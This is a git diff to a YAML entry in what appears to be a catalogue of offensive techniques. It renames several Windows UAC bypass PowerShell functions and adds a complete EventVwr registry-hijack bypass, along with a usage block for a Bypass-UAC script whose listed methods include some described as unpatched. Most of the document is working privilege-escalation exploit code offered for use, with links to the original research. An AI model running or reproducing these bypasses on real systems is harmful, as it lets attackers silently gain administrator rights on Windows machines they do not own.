@@ -3,7 +3,7 @@ functions:
   privilege-escalation:
     - description: Bypass the Windows User Access Controal (UAC)
       code: |
-        function FodhelperUACBypass(){ 
+        function UAC-FodhelperBypass(){ 
  
         Param (    
          
@@ -25,11 +25,11 @@ functions:
         Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
          
         }
-        FodhelperUACBypass -command "cmd.exe"
 
 
 
-        function CMSTPUACBypass() {
+
+        function UAC-CMSTPBypass() {
             Param(
                 [String]$command = ""
             )
@@ -40,7 +40,9 @@ functions:
             [CMSTPBypass]::Execute($Command)
         }
 
-          function CompMgmtLauncherUACBypass {
+
+
+          function UAC-CompMgmtLauncherBypass {
 
 
               [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
@@ -100,9 +102,91 @@ functions:
               }
           }
 
+
+          function UAC-EventVwrBypass {
+              [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
+              Param (
+                  [Parameter(Mandatory = $True)]
+                  [ValidateNotNullOrEmpty()]
+                  [String]
+                  $command,
+
+                  [Switch]
+                  $Force
+              )
+              $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+              $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
+
+              if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
+                  "UAC is set to 'Always Notify'. This module does not bypass this setting."
+                  exit
+              }
+              else{
+                  #Begin Execution
+                  $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+                  $Command = $pshome + '\' + $Command
+                  #Add in the new registry entries to hijack the msc file
+                  if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
+                      New-Item $mscCommandPath -Force |
+                          New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
+                  }else{
+                      Write-Warning "Key already exists, consider using -Force"
+                      exit
+                  }
+
+                  if (Test-Path $mscCommandPath) {
+                      Write-Verbose "Created registry entries to hijack the msc extension"
+                  }else{
+                      Write-Warning "Failed to create registry key, exiting"
+                      exit
+                  }
+
+                  $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
+                  #Start Event Viewer
+                  if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
+                      $Process = Start-Process -FilePath $EventvwrPath -PassThru
+                      Write-Verbose "Started eventvwr.exe"
+                  }
+
+                  #Sleep 5 seconds 
+                  Write-Verbose "Sleeping 5 seconds to trigger payload"
+                  if (-not $PSBoundParameters['WhatIf']) {
+                      Start-Sleep -Seconds 5
+                  }
+
+                  $mscfilePath = "HKCU:\Software\Classes\mscfile"
+
+                  if (Test-Path $mscfilePath) {
+                      #Remove the registry entry
+                      Remove-Item $mscfilePath -Recurse -Force
+                      Write-Verbose "Removed registry entries"
+                  }
+
+                  if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
+                      Stop-Process -Id $Process.Id
+                      Write-Verbose "Killed running eventvwr process"
+                  }
+              }
+          }
+    - description: Bypass the Windows User Access Controal (UAC) [Script]
+      code: |
+        . .\Bypass-UAC.ps1
+        Bypass-UAC -Method UacMethodSysprep
+        * UacMethodSysprep: Original technique by Leo Davidson (sysprep -> cryptbase.dll) 
+          * Targets: x32/x64 Windows 7 & 8 
+        * ucmDismMethod: Hybrid method (PkgMgr -> DISM -> dismcore.dll) 
+          * Targets: x64 Win7+ (currently unpatched) 
+        * UacMethodMMC2: Hybrid method (mmc -> rsop.msc -> wbemcomn.dll) 
+          * Targets: x64 Win7+ (currently unpatched) 
+        * UacMethodTcmsetup: Hybrid method (tcmsetup -> tcmsetup.exe.local -> comctl32.dll) 
+          * Targets: x32/x64 Win7+ (UAC "0day" ¯\_(ツ)_/¯) 
+        * UacMethodNetOle32: Hybrid method (mmc some.msc -> Microsoft.NET\Framework[64]\..\ole32.dll) 
+          * Targets: x32/x64 Win7+ (UAC "0day" ¯\_(ツ)_/¯) 
 resources : |
   https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
   https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
   http://www.fuzzysecurity.com/tutorials/27.html
+  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+  https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
 ---
 
